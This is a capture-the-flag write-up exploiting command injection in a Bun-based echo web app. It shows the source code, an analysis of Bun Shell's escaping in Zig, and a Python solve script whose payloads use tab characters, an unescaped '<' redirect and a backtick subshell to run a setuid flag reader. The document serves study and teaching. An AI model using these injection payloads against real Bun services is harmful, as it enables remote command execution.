# Challenge
- Name: Echo as a Service
- Author: lebr0nli
- Difficulty: hard (personal opinion)
  
  ![image](https://github.com/user-attachments/assets/231f40e8-aa24-4a01-82ae-9990ce295698)

- Note: I was not able to solve this challenge during competition :(

# Recon
- The site has a minimal design with a submit button. We can submit anything and it will return exactly what we entered:

  ![image](https://github.com/user-attachments/assets/bc401f0e-2518-49a9-b3a8-b8e575317a96)
  ![image](https://github.com/user-attachments/assets/f7df5372-064e-4dd8-b61d-9d2f0ae4b4f4)

- Not so much thing to do here, so I decided to read the source code. It is also pretty simple:
  - This is the directory tree:
    
    ![image](https://github.com/user-attachments/assets/e5493f10-5cd6-4ff6-b0fc-d1980275ecdb)

  - index.js:
    ```javascript
    import { $ } from "bun";

    const server = Bun.serve({
        host: "0.0.0.0",
        port: 1337,
        async fetch(req) {
            const url = new URL(req.url);
            if (url.pathname === "/") {
                return new Response(`
                    <p>Welcome to echo-as-a-service! Try it out:</p>
                    <form action="/echo" method="POST">
                        <input type="text" name="msg" />
                        <input type="submit" value="Submit" />
                    </form>
                `.trim(), { headers: { "Content-Type": "text/html" } });
            }
            else if (url.pathname === "/echo") {
                const msg = (await req.formData()).get("msg");
                if (typeof msg !== "string") {
                    return new Response("Something's wrong, I can feel it", { status: 400 });
                }
                
                var output = await $`echo ${msg}`.text();
                return new Response(output, { headers: { "Content-Type": "text/plain" } });
            }
        }
    });
    
    console.log(`listening on http://localhost:${server.port}`);
    ```

  - readflag.c:
    ```c
    #include <stdio.h>
    #include <string.h>
    
    int main(int argc, char *argv[]) {
        seteuid(0);
        setegid(0);
        setuid(0);
        setgid(0);
        
        if(argc < 5) {
            printf("Usage: %s give me the flag\n", argv[0]);
            return 1;
        }
    
        if ((strcmp(argv[1], "give") | strcmp(argv[2], "me") | strcmp(argv[3], "the") | strcmp(argv[4], "flag")) != 0) {
            puts("You are not worthy");
            return 1;
        }
    
        char flag[256] = { 0 };
        FILE* fp = fopen("/flag", "r");
        if (!fp) {
            perror("fopen");
            return 1;
        }
        if (fread(flag, 1, 256, fp) < 0) {
            perror("fread");
            return 1;
        }
        puts(flag);
        fclose(fp);
        return 0;
    }
    ```
  - Dockerfile:
    ```Dockerfile
    FROM oven/bun:1.1.8-slim
    RUN apt-get update && apt-get install -y gcc
    
    RUN useradd -ms /bin/bash ctf
    
    WORKDIR /home/ctf/app
    
    # Setup challenge
    COPY ./src/index.js .
    RUN chown -R ctf:ctf /home/ctf/app
    
    # Setup flag & readflag
    COPY ./flag/readflag.c /readflag.c
    COPY ./flag/flag /flag
    RUN chmod 0400 /flag && chown root:root /flag
    RUN chmod 0444 /readflag.c && gcc /readflag.c -o /readflag
    RUN chown root:root /readflag && chmod 4555 /readflag
    
    USER ctf
    ENV NODE_ENV=production
    CMD ["bun", "index.js"]
    ```
  - In index.js, the server using Bun to host the entire server. It using *fetch()* API to define the logic at routes "/" and "/echo".
    - At "/", it return a simple HTML form to user.
    - At "/echo", there are some work to do:
      - The application take the *msg* value which come from user summited form. If the data type of summited data is not string, a bad request will be returned:
        ```javascript
        else if (url.pathname === "/echo") {
              const msg = (await req.formData()).get("msg");  // untrusted data
              if (typeof msg !== "string") {
                  return new Response("Something's wrong, I can feel it", { status: 400 });
              }
        ```
      - If the condition is met, that *msg* will be used as input for Bun Shell. After the shell processed the input, the webapp return the result to the user as text/plain:
        ```javascript
        var output = await $`echo ${msg}`.text();
        return new Response(output, { headers: { "Content-Type": "text/plain" } });
        ```
  - *readflag.c* is a program that allow user to read /flag.txt with root privilege. It receives 4 command line arguments, if the arguments are "give", "me", "the", "flag", respectively, the program will print the flag string. This is a typical program for a challenge that require player to perform OS command injection or RCE. 
  - Notice that *msg* is not sanitized, and Bun Shell is a Bash-like shell, so this is a OS command injection gadget.

 # Exploit
 ## Documentation
 - According to the [document](https://bun.sh/docs/runtime/shell), Bun Shell acts like a bash shell. It has an alias "$" that call the Shell object directly. Notably, the shell will escape all string by default, prevent command injection attack.
 - After reading the document, it can be clearly seen that the shell interprete the string inside backtick `` as a subshell. Let's give it a try:

   ![image](https://github.com/user-attachments/assets/1637a199-72f0-48eb-a897-856b73354ea7)

- We can see that the webapp is vulnerable to command injection.

## Behaviour
- I tried to run the /readflag program, and the result:

  ![image](https://github.com/user-attachments/assets/24f90262-3253-4349-be70-c0e22d882a81)

- The program run as expected, but it need arguments as declared above. If I send some space character to the application:

  ![image](https://github.com/user-attachments/assets/50a0bd5f-0867-4df0-997a-78cfe75014fc)
  What we sent was returned. It indicate that there was some sanitization actions happened within the API. 

## Examine the API
- In Dockerfile, it use Bun 1.1.8. We can download that version from [Github](https://github.com/oven-sh/bun/releases/tag/bun-v1.1.8)
- In bun.d.ts, the Bun Shell is declared with an interface:

  ![image](https://github.com/user-attachments/assets/974bdc96-80dd-4cb3-93d9-c797b9aafc73)

- It has the method *escape(input: string)* which made me noticed. I tried to look for the underlying code and was able to see the real code of the shell in *src/shell/shell.zig*.

  ![image](https://github.com/user-attachments/assets/02114323-091d-4271-8540-fee21ca7d86b)

- After a while, I saw the charset that wil be escaped:

  ![image](https://github.com/user-attachments/assets/86b8b199-d380-438f-9884-3c4fdde15bd1)

- In bash shell, there were some special characters that treated by the shell as white-space. One of them was \t character. For example, I tried to echo a string included \t character. let's see what happened:
  ```bash
  test="This    is  a   test    string"
  ```
  ![image](https://github.com/user-attachments/assets/c60890fe-f50e-4a3b-8e1d-b3c9bbcbefc2)

- It is clearly that the bash shell treated \t as a space. How about Bun shell? This is my *test.js* file for testing:
  ```javascript
  const { $ } = require("bun")

  var output = async () => {
      var x = await $`echo This    is  a   test    string`.text();
      return x;
  }
  output().then(result => {
      console.log(result);
  })
  ```
  ![image](https://github.com/user-attachments/assets/cfca8e9d-bd29-4875-a8b9-c0d1f80ec9c8)

- The result indicate that we can use the tab character as a space. The SPECIAL_CHARS array (which used by Bun Shell for escaping reason) does not have \t, so it will not be escaped. But it's not as easy as I think:

  ![image](https://github.com/user-attachments/assets/6e89f336-e03c-49b9-abfd-b161d03ec0f2)

  ![image](https://github.com/user-attachments/assets/52cbe8ec-e310-4927-8387-75ca53d297d9)

- The shell accepted that payload, but ... nothing happened. I don't know why the subshell did not executed it, but when I send the payload ```man%09ls``` to the server, it also did not run, so I guess if the subshell contains an extra cmd line argument, the process will exit.
- On the other hand, there is a noticeable function in src/shell/shell.zig:
  ```zig
  // TODO Arbitrary file descriptor redirect
        fn eat_redirect(self: *@This(), first: InputChar) ?AST.RedirectFlags {
            var flags: AST.RedirectFlags = .{};
            switch (first.char) {
                '0' => flags.stdin = true,
                '1' => flags.stdout = true,
                '2' => flags.stderr = true,
                // Just allow the std file descriptors for now
                else => return null,
            }
            var dir: RedirectDirection = .out;
            if (self.peek()) |input| {
                if (input.escaped) return null;
                switch (input.char) {
                    '>' => {
                        _ = self.eat();
                        dir = .out;
                        const is_double = self.eat_simple_redirect_operator(dir);
                        if (is_double) flags.append = true;
                        if (self.peek()) |peeked| {
                            if (!peeked.escaped and peeked.char == '&') {
                                _ = self.eat();
                                if (self.peek()) |peeked2| {
                                    switch (peeked2.char) {
                                        '1' => {
                                            _ = self.eat();
                                            if (!flags.stdout and flags.stderr) {
                                                flags.duplicate_out = true;
                                                flags.stdout = true;
                                                flags.stderr = false;
                                            } else return null;
                                        },
                                        '2' => {
                                            _ = self.eat();
                                            if (!flags.stderr and flags.stdout) {
                                                flags.duplicate_out = true;
                                                flags.stderr = true;
                                                flags.stdout = false;
                                            } else return null;
                                        },
                                        else => return null,
                                    }
                                }
                            }
                        }
                        return flags;
                    },
                    '<' => {
                        dir = .in;
                        const is_double = self.eat_simple_redirect_operator(dir);
                        if (is_double) flags.append = true;
                        return flags;
                    },
                    else => return null,
                }
            } else return null;
        }
  ```
- The function tell us that the shell also support IO redirect using > and <. The output redirect character ">" is in the SPECIAL_CHARS array mentioned above, but "<" is not, so we have an arbitrary file write here. We can setup a simple test:

  ![image](https://github.com/user-attachments/assets/6c9e7667-44bb-4db0-87e4-2027d771e4d6)
  ![image](https://github.com/user-attachments/assets/31abdbdb-e72c-4102-b26c-79555b0da6e0)

- We can see that ```lmao``` was created, with the string "whoami" inside. So, we should try to redirect the content of that file to ```sh```:

  ![image](https://github.com/user-attachments/assets/78d35e19-516d-4a53-a992-bcc072fe41c1)
  => The command has been executed.

# Cat the flag
- With all the information collected, the exploit will be:
    1. Created a file with the content: "/readflag give me the flag" using the behavior where the \t character is treated as space character.
    2. Redirect the file content to sh, then use backtick to spawn a subshell to execute it.

  ```python
  # solve.py
  #!/usr/bin/python3
  import requests
  
  PORT = 59950
  URL = f"http://127.0.0.1:{PORT}/echo"
  
  requests.post(
      url = URL,
      data = "msg=/readflag\tgive\tme\tthe\tflag1<lmao",
      headers = {
          "Content-Type" : "application/x-www-form-urlencoded"
      }
  )
  
  r = requests.post(
      url = URL,
      data = "msg=`sh<lmao`",
          headers = {
          "Content-Type" : "application/x-www-form-urlencoded"
      }
  )
  
  print(r.text)
  ```

  ![image](https://github.com/user-attachments/assets/45f6be8d-b011-4838-a04b-599da7a0f091)

# Note
- Bun is a JS package based on Zig programming language, which is considered as better version of C language. String in Zig is terminated with a null character like C, so it's vulnerable to nullbyte injection. In the payload below, we can see the difference between the two payload: one has nullbyte, and one doesn't:

  ![image](https://github.com/user-attachments/assets/b49670b9-9af3-4f5c-ac5d-7955037d83e0)
  ![image](https://github.com/user-attachments/assets/aa2592a7-51df-4a17-9d24-07c9d4972e8c)
